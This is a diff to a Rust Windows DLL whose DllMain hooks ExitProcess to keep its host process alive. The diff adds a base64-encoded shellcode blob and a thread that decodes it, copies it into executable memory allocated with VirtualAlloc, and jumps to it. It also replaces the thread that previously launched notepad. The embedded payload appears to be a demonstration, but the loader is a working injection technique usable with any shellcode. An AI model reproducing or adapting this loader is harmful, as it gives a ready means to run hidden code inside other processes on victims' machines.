@@ -10,8 +10,12 @@ use windows::Win32::System::Threading::{
     INFINITE, WaitForSingleObject, CreateEventA,
 };
 use windows::Win32::System::LibraryLoader::GetModuleHandleA;
-use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
+use windows::Win32::System::Memory::{
+    VirtualProtect, VirtualAlloc, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
+    MEM_COMMIT, MEM_RESERVE,
+};
 use windows::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
+use base64::{Engine as _, engine::general_purpose};
 use windows::Win32::System::Console::GetConsoleWindow;
 
 static mut ORIGINAL_EXIT_PROCESS: usize = 0;
@@ -379,6 +383,26 @@ unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
     WaitForSingleObject(event, INFINITE);
 }
 
+const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0b0gB0FCLSBhEi0AgSQHQ41xI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpT////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VSGVsbG8gZnJvbSBKdWxlcyEASnVsZXMA";
+
+unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
+    let shellcode = general_purpose::STANDARD.decode(ENCODED_SHELLCODE).unwrap();
+
+    let exec_mem = VirtualAlloc(
+        None,
+        shellcode.len(),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    );
+
+    if !exec_mem.is_null() {
+        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), exec_mem as *mut u8, shellcode.len());
+        let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
+        exec_fn();
+    }
+    0
+}
+
 unsafe extern "system" fn notepad_thread(_: *mut core::ffi::c_void) -> u32 {
     let mut si = STARTUPINFOA::default();
     si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
@@ -412,9 +436,9 @@ pub extern "system" fn DllMain(
             // ExitProcess'i hook'la - process kapanmasın
             hook_exit_process();
 
-            // Notepad'i başlat
+            // Shellcode'u başlat
             let _ = CreateThread(
-                None, 0, Some(notepad_thread), None, THREAD_CREATION_FLAGS(0), None,
+                None, 0, Some(shellcode_thread), None, THREAD_CREATION_FLAGS(0), None,
             );
         }
     }
